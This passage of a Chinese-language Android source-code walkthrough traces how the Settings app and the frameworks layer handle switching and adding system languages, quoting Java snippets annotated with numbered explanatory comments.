class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setHasOptionsMenu(<span class="literal">true</span>);</span><br><span class="line">   <span class="comment">// 注释1_4: 这里是已经添加列表数据的初始化，获取和填充 这里的 LocaleStore getUserLocaleList（）</span></span><br><span class="line">   <span class="comment">// 所涉及的 LocaleList LocalePiker 都是frameworks层的实现，后面会说到</span></span><br><span class="line">      LocaleStore.fillCache(<span class="built_in">this</span>.getContext());</span><br><span class="line">      <span class="keyword">final</span> List&lt;LocaleStore.LocaleInfo&gt; feedsList = getUserLocaleList();</span><br><span class="line">      mAdapter = <span class="keyword">new</span> <span class="title class_">LocaleDragAndDropAdapter</span>(<span class="built_in">this</span>.getContext(), feedsList);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container, Bundle savedInstState)</span> &#123;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">View</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">super</span>.onCreateView(inflater, container, savedInstState);</span><br><span class="line">      <span class="comment">//注释1_4: 这里加载了布局 locale_order_list.xml 比较简单 一个列表 和 一个添加按钮</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">View</span> <span class="variable">myLayout</span> <span class="operator">=</span> inflater.inflate(R.layout.locale_order_list, (ViewGroup) result);</span><br><span class="line"></span><br><span class="line">      configureDragAndDrop(myLayout);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">   <span class="comment">// 注释1_5: 这里的方法，对应上面注释1_4。即已添加的语言列表数据</span></span><br><span class="line">   <span class="keyword">private</span> List&lt;LocaleStore.LocaleInfo&gt; getUserLocaleList() &#123;</span><br><span class="line">      <span class="keyword">final</span> List&lt;LocaleStore.LocaleInfo&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">final</span> <span class="type">LocaleList</span> <span class="variable">localeList</span> <span class="operator">=</span> LocalePicker.getLocales();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; localeList.size(); i++) &#123;</span><br><span class="line">         <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span> localeList.get(i);</span><br><span class="line">         result.add(LocaleStore.getLocaleInfo(locale));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureDragAndDrop</span><span class="params">(View view)</span> &#123;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">RecyclerView</span> <span class="variable">list</span> <span class="operator">=</span> view.findViewById(R.id.dragList);</span><br><span class="line">      <span class="keyword">final</span> <span class="type">LocaleLinearLayoutManager</span> <span class="variable">llm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocaleLinearLayoutManager</span>(getContext(), mAdapter);</span><br><span class="line">      llm.setAutoMeasureEnabled(<span class="literal">true</span>);</span><br><span class="line">      list.setLayoutManager(llm);</span><br><span class="line"></span><br><span class="line">      list.setHasFixedSize(<span class="literal">true</span>);</span><br><span class="line">      mAdapter.setRecyclerView(list);</span><br><span class="line">      list.setAdapter(mAdapter);</span><br><span class="line"></span><br><span class="line">      mAddLanguage = view.findViewById(R.id.add_language);</span><br><span class="line">      <span class="comment">// 注释1_6: 这里是添加按钮的监听</span></span><br><span class="line">      mAddLanguage.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">               FeatureFactory.getFactory(getContext()).getMetricsFeatureProvider()</span><br><span class="line">                     .logSettingsTileClick(INDEX_KEY_ADD_LANGUAGE, getMetricsCategory());</span><br><span class="line"></span><br><span class="line">               <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(getActivity(),</span><br><span class="line">                     LocalePickerWithRegionActivity.class);</span><br><span class="line">               startActivityForResult(intent, REQUEST_LOCALE_PICKER);</span><br><span class="line">         &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">   </span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><p>已添加语言的由前面分析可以知道，布局<strong>locale_order_list.xml</strong>里面是由</p><p>自定义RecyclerView列表：<strong>src/com/android/settings/localepicker/LocaleRecyclerView.java</strong></p><p>数据适配器：<strong>src/com/android/settings/localepicker/LocaleDragAndDropAdapter.java</strong></p><p>来组合实现的，先看下</p><p><strong>LocaleDragAndDropAdapter.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTheUpdate</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> mFeedItemList.size();</span><br><span class="line">      <span class="keyword">final</span> Locale[] newList = <span class="keyword">new</span> <span class="title class_">Locale</span>[count];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">         <span class="keyword">final</span> LocaleStore.<span class="type">LocaleInfo</span> <span class="variable">li</span> <span class="operator">=</span> mFeedItemList.get(i);</span><br><span class="line">         newList[i] = li.getLocale();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="type">LocaleList</span> <span class="variable">ll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocaleList</span>(newList);</span><br><span class="line">      <span class="comment">// 注释1_7: 前面都是做准备工作，这里调用这个做更实质的处理</span></span><br><span class="line">      updateLocalesWhenAnimationStops(ll);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">private</span> <span class="type">LocaleList</span> <span class="variable">mLocalesToSetNext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">LocaleList</span> <span class="variable">mLocalesSetLast</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateLocalesWhenAnimationStops</span><span class="params">(<span class="keyword">final</span> LocaleList localeList)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (localeList.equals(mLocalesToSetNext)) &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// This will only update the Settings application to make things feel more responsive,</span></span><br><span class="line">      <span class="comment">// the system will be updated later, when animation stopped.</span></span><br><span class="line">      LocaleList.setDefault(localeList);</span><br><span class="line"></span><br><span class="line">      mLocalesToSetNext = localeList;</span><br><span class="line">      <span class="keyword">final</span> RecyclerView.<span class="type">ItemAnimator</span> <span class="variable">itemAnimator</span> <span class="operator">=</span> mParentView.getItemAnimator();</span><br><span class="line">      itemAnimator.isRunning(<span class="keyword">new</span> <span class="title class_">RecyclerView</span>.ItemAnimator.ItemAnimatorFinishedListener() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAnimationsFinished</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (mLocalesToSetNext == <span class="literal">null</span> || mLocalesToSetNext.equals(mLocalesSetLast)) &#123;</span><br><span class="line">                  <span class="comment">// All animations finished, but the locale list did not change</span></span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            <span class="comment">// 注释1_8: 当已添加的语言数目发生了改变，则调用frameworks 层的 </span></span><br><span class="line">            <span class="comment">// LocalePicker的 updateLocales 方法处理，具体后面看</span></span><br><span class="line">               LocalePicker.updateLocales(mLocalesToSetNext);</span><br><span class="line">               mLocalesSetLast = mLocalesToSetNext;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ShortcutsUpdateTask</span>(mContext).execute();</span><br><span class="line"></span><br><span class="line">               mLocalesToSetNext = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">               mNumberFormatter = NumberFormat.getNumberInstance(Locale.getDefault());</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>初看可能有点疑惑，这个<strong>doTheUpdate</strong>方法 在哪里调用和触发的呢？</p><p><strong>LocaleRecyclerView.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent e)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (e.getAction() == MotionEvent.ACTION_UP || e.getAction() == MotionEvent.ACTION_CANCEL) &#123;</span><br><span class="line">      <span class="type">LocaleDragAndDropAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> (LocaleDragAndDropAdapter) <span class="built_in">this</span>.getAdapter();</span><br><span class="line">      <span class="keyword">if</span> (adapter != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 注释1_9: 这里一目了然，当列表的触摸事件手指离开的时候，便会触发这个更新</span></span><br><span class="line">            adapter.doTheUpdate();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">super</span>.onTouchEvent(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于Settings 切换已选语言的处理流程基本就这些了，然后说下添加的流程。</p><h3 id="添加流程"><a href="#添加流程" class="headerlink" title="添加流程"></a>添加流程</h3><p>前面的介绍在 注释1_6 处，<strong>LocaleListEditor.java</strong>的添加语言的按钮，点击监听事件里是流程的入口，会跳转</p><p><strong>src/com/android/settings/localepicker/LocalePickerWithRegionActivity.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">   getActionBar().setDisplayHomeAsUpEnabled(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 注释1_10: 这里的页面以及逻辑实现都交给了 LocalePickerWithRegion ，</span></span><br><span class="line"><span class="comment">// 这个类的实现也是在frameworks 层</span></span><br><span class="line">   <span class="keyword">final</span> <span class="type">LocalePickerWithRegion</span> <span class="variable">selector</span> <span class="operator">=</span> LocalePickerWithRegion.createLanguagePicker(</span><br><span class="line">            <span class="built_in">this</span>, LocalePickerWithRegionActivity.<span class="built_in">this</span>, <span class="literal">false</span> <span class="comment">/* translate only */</span>);</span><br><span class="line">   getFragmentManager()</span><br><span class="line">            .beginTransaction()</span><br><span class="line">            .setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN)</span><br><span class="line">            .replace(android.R.id.content, selector)</span><br><span class="line">            .addToBackStack(PARENT_FRAGMENT_NAME)</span><br><span class="line">            .commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，添加的流程，Settings 的添加流程到这里也就结束了</p><h2 id="Frameworks-部分"><a href="#Frameworks-部分" class="headerlink" title="Frameworks 部分"></a>Frameworks 部分</h2><h3 id="切换流程-1"><a href="#切换流程-1" class="headerlink" title="切换流程"></a>切换流程</h3><p>由前面分析可知：切换语言Settings 处理跳转到 framework 的入口是<strong>LocalePicker</strong>的<strong>updateLocales</strong>方法</p><p><strong>base/core/java/com/android/internal/app/LocalePicker.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Requests the system to update the list of system locales.</span></span><br><span class="line"><span class="comment">   * Note that the system looks halted for a while during the Locale migration,</span></span><br><span class="line"><span class="comment">   * so the caller need to take care of it.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="meta">@UnsupportedAppUsage</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateLocales</span><span class="params">(LocaleList locales)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (locales != <span class="literal">null</span>) &#123;</span><br><span class="line">         locales = removeExcludedLocales(locales);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Note: the empty list case is covered by Configuration.setLocales().</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">IActivityManager</span> <span class="variable">am</span> <span class="operator">=</span> ActivityManager.getService();</span><br><span class="line">         <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> am.getConfiguration();</span><br><span class="line">      <span class="comment">// 注释2_1：这里对切换语言后的数据封装到Configuration里，用于后面流程处理</span></span><br><span class="line">         config.setLocales(locales);</span><br><span class="line">         config.userSetLocale = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">// 注释2_2： 这里通过ActivityManager的一个Binder服务，调用</span></span><br><span class="line">      <span class="comment">// updatePersistentConfigurationWithAttribution 继续处理</span></span><br><span class="line">         am.updatePersistentConfigurationWithAttribution(config,</span><br><span class="line">                  ActivityThread.currentOpPackageName(), <span class="literal">null</span>);</span><br><span class="line">         <span class="comment">// Trigger the dirty bit for the Settings Provider.</span></span><br><span class="line">         BackupManager.dataChanged(<span class="string">&quot;com.android.providers.settings&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">         <span class="comment">// Intentionally left blank</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里是通过 Binder 获取 ActivityManager 的一个服务代理对象，来处理 实现方法是 <strong>updatePersistentConfigurationWithAttribution</strong><br>这里ActivityManager的Binder 实际处理对象是：<br><strong>base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updatePersistentConfiguration</span><span class="params">(Configuration values)</span> &#123;</span><br><span class="line">   updatePersistentConfigurationWithAttribution(values,</span><br><span class="line">            Settings.getPackageNameForUid(mContext, Binder.getCallingUid()), <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updatePersistentConfigurationWithAttribution</span><span class="params">(Configuration values,</span></span><br><span class="line"><span class="params">      String callingPackage, String callingAttributionTag)</span> &#123;</span><br><span class="line">   enforceCallingPermission(CHANGE_CONFIGURATION, <span class="string">&quot;updatePersistentConfiguration()&quot;</span>);</span><br><span class="line">   enforceWriteSettingsPermission(<span class="string">&quot;updatePersistentConfiguration()&quot;</span>, callingPackage,</span><br><span class="line">            callingAttributionTag);</span><br><span class="line">   <span class="keyword">if</span> (values == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Configuration must not be null&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> UserHandle.getCallingUserId();</span><br><span class="line"><span class="comment">// 注释2_3：可以看到，这里流程将处理方法又传递给了 mActivityTaskManager 实例的updatePersistentConfiguration 方法</span></span><br><span class="line">   mActivityTaskManager.updatePersistentConfiguration(values, userId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的mActivityTaskManager的实例即 <strong>ActivityTaskManagerService.java</strong>，来看看内部实现</p><p><strong>base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong><br>通过内部层层调用，以及一些判断条件的筛选，最后会执行到(方法内部处理逻辑很多，挑重点看下)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Update default (global) configuration and notify listeners about changes. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateGlobalConfigurationLocked</span><span class="params">(<span class="meta">@NonNull</span> Configuration values, <span class="type">boolean</span> initLocale,</span></span><br><span class="line"><span class="params">      <span class="type">boolean</span> persistent, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">      </span><br><span class="line">   ......</span><br><span class="line">   <span class="comment">// 注释2_4：这里对切换语言后封装的Configuration做后续处理的预检查和判断</span></span><br><span class="line">      <span class="keyword">if</span> (!initLocale &amp;&amp; !values.getLocales().isEmpty() &amp;&amp; values.userSetLocale) &#123;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">LocaleList</span> <span class="variable">locales</span> <span class="operator">=</span> values.getLocales();</span><br><span class="line">      <span class="type">int</span> <span class="variable">bestLocaleIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (locales.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mSupportedSystemLocales == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 注释2_5：这里是获取系统资源配置支持的语言，也就是说实际能真的支持的语言</span></span><br><span class="line">               mSupportedSystemLocales = Resources.getSystem().getAssets().getLocales();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 注释2_6：这里是通过方法计算得到在所有支持语言列表里 最匹配的语言的所在列表的 索引</span></span><br><span class="line">            <span class="comment">// 具体算法可getFirstMatchIndex 一路点进去看</span></span><br><span class="line">            bestLocaleIndex = Math.max(<span class="number">0</span>, locales.getFirstMatchIndex(mSupportedSystemLocales));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 注释2_7：这里是修改系统属性值，即 当前系统的默认语言</span></span><br><span class="line">      SystemProperties.set(<span class="string">&quot;persist.sys.locale&quot;</span>,</span><br><span class="line">               locales.get(bestLocaleIndex).toLanguageTag());</span><br><span class="line">      LocaleList.setDefault(locales, bestLocaleIndex);</span><br><span class="line">   <span class="comment">// 注释2_8：这里是将切换语言的动作通过 handler - message 的形式分发出去，以通知系统各个地方刷新</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">m</span> <span class="operator">=</span> PooledLambda.obtainMessage(</span><br><span class="line">               ActivityTaskManagerService::sendLocaleToMountDaemonMsg, <span class="built_in">this</span>,</span><br><span class="line">               locales.get(bestLocaleIndex));</span><br><span class="line">      mH.sendMessage(m);</span><br><span class="line">   &#125;</span><br><span class="line">   ......      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>切换语言的流程，简单的流程就到这里，其余就不在详细展开了</p><h3 id="添加流程-1"><a href="#添加流程-1" class="headerlink" title="添加流程"></a>添加流程</h3><p>由前面分析可知，添加流程由 Settings 的 <strong>LocalePickerWithRegionActivity.java</strong>到 frameworks 的 <strong>LocalePickerWithRegion.java</strong><br><strong>base/core/java/com/android/internal/app/LocalePickerWithRegion.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onListItemClick</span><span class="params">(ListView l, View v, <span class="type">int</span> position, <span class="type">long</span> id)</span> &#123;</span><br><span class="line">      <span class="keyword">final</span> LocaleStore.<span class="type">LocaleInfo</span> <span class="variable">locale</span> <span class="operator">=</span></span><br><span class="line">               (LocaleStore.LocaleInfo) getListAdapter().getItem(position);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (locale.getParent() != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (mListener != <span class="literal">null</span>) &#123;</span><br><span class="line">               mListener.onLocaleSelected(locale);</span><br><span class="line">         &#125;</span><br><span class="line">         returnToParentFrame();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 注释2_9：这里是语言列表的点击事件，即代表这开启了被点击语言的添加流程</span></span><br><span class="line">      <span class="comment">// 这里是 用到本类的 createCountryPicker 方法 </span></span><br><span class="line">         <span class="type">LocalePickerWithRegion</span> <span class="variable">selector</span> <span class="operator">=</span> LocalePickerWithRegion.createCountryPicker(</span><br><span class="line">                  getContext(), mListener, locale, mTranslatedOnly <span class="comment">/* translate only */</span>);</span><br><span class="line">         <span class="keyword">if</span> (selector != <span class="literal">null</span>) &#123;</span><br><span class="line">               getFragmentManager().beginTransaction()</span><br><span class="line">                     .setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN)</span><br><span class="line">                     .replace(getId(), selector).addToBackStack(<span class="literal">null</span>)</span><br><span class="line">                     .commit();</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               returnToParentFrame();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注释2_10_1：看上一步，调用的是这个4个参数的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> LocalePickerWithRegion <span class="title function_">createCountryPicker</span><span class="params">(Context context,</span></span><br><span class="line"><span class="params">         LocaleSelectedListener listener, LocaleStore.LocaleInfo parent,</span></span><br><span class="line"><span class="params">         <span class="type">boolean</span> translatedOnly)</span> &#123;   </span><br><span class="line">      <span class="type">LocalePickerWithRegion</span> <span class="variable">localePicker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocalePickerWithRegion</span>();</span><br><span class="line">      <span class="comment">// 注释2_10_2：重要是这一步，调用了localePicker.setListener，localePicker是LocalePickerWithRegion</span></span><br><span class="line">      <span class="comment">// 实例化的对象，于是将流程传递给了本类的setListener方法</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">shouldShowTheList</span> <span class="operator">=</span> localePicker.setListener(context, listener, parent,</span><br><span class="line">               translatedOnly);</span><br><span class="line">      <span class="keyword">return</span> shouldShowTheList ? localePicker : <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> LocalePickerWithRegion <span class="title function_">createLanguagePicker</span><span class="params">(Context context,</span></span><br><span class="line"><span class="params">         LocaleSelectedListener listener, <span class="type">boolean</span> translatedOnly)</span> &#123;</span><br><span class="line">      <span class="type">LocalePickerWithRegion</span> <span class="variable">localePicker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocalePickerWithRegion</span>();</span><br><span class="line">      localePicker.setListener(context, listener, <span class="comment">/* parent */</span> <span class="literal">null</span>, translatedOnly);</span><br><span class="line">      <span class="keyword">return</span> localePicker;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">setListener</span><span class="params">(Context context, LocaleSelectedListener listener,</span></span><br><span class="line"><span class="params">         LocaleStore.LocaleInfo parent, <span class="type">boolean</span> translatedOnly)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.mParentLocale = parent;</span><br><span class="line">      <span class="built_in">this</span>.mListener = listener;</span><br><span class="line">      <span 